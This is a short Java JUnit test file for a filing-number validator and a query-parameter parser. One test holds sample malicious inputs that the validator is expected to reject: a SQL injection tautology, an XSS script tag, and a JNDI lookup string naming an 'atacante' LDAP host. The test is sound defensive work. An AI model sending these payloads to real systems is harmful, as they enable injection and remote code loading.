package co.edu.cartilla;

import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

class ValidadorTest {

    @Test
    void aceptaRadicadoConFormatoCorrecto() {
        assertTrue(Validador.esRadicadoValido("RAD-2026-00123"));
    }

    @Test
    void rechazaEntradasMaliciosasOIncompletas() {
        assertFalse(Validador.esRadicadoValido(null));
        assertFalse(Validador.esRadicadoValido(""));
        assertFalse(Validador.esRadicadoValido("RAD-2026-00123' OR '1'='1"));
        assertFalse(Validador.esRadicadoValido("<script>alert(1)</script>"));
        assertFalse(Validador.esRadicadoValido("${jndi:ldap://atacante/a}"));
    }

    @Test
    void extraeParametroDeLaConsulta() {
        assertEquals("RAD-2026-00123", App.parametro("numero=RAD-2026-00123&x=1", "numero"));
        assertNull(App.parametro(null, "numero"));
    }
}
